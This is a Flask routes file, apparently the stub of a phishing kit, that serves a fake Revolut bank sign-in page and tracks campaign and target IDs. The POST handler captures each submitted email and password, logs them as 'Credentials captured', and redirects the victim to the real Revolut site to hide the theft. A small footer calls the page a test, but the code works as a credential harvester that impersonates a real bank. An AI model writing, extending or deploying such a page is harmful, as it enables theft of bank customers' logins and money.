# ==========================================
# routes/fake_revolut.py - STUB
# ==========================================

"""
Fake Revolut routes - Site-ul fake
TODO: Implementare completă
"""

from flask import Blueprint, request, redirect

bp = Blueprint('fake_revolut', __name__)

@bp.route('/login')
def login_page():
    """Pagina de login fake - STUB"""
    campaign_id = request.args.get('c', 'unknown')
    target_id = request.args.get('t', 'unknown')
    
    print(f"STUB: Fake login page accessed - Campaign: {campaign_id}, Target: {target_id}")
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Revolut - Sign In</title>
        <style>
            body {{ font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }}
            .logo {{ text-align: center; color: #0066cc; font-size: 24px; margin-bottom: 30px; }}
            .form-group {{ margin-bottom: 15px; }}
            input {{ width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }}
            button {{ width: 100%; padding: 12px; background: #0066cc; color: white; border: none; border-radius: 5px; }}
        </style>
    </head>
    <body>
        <div class="logo">🏦 Revolut</div>
        <h2>Sign in to your account</h2>
        
        <form method="POST">
            <div class="form-group">
                <input type="email" name="username" placeholder="Email" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        
        <p><small>STUB: This is a fake login page for testing</small></p>
    </body>
    </html>
    """

@bp.route('/login', methods=['POST'])
def login_submit():
    """Procesarea formularului fake - STUB"""
    username = request.form.get('username')
    password = request.form.get('password')
    
    print(f"STUB: Credentials captured - {username} / {password}")
    
    # Redirect to real Revolut
    return redirect('https://revolut.com')

@bp.route('/register')
def register_page():
    """Pagina de înregistrare fake - STUB"""
    return "<h1>🏦 Revolut Register</h1><p>Register page coming soon...</p>"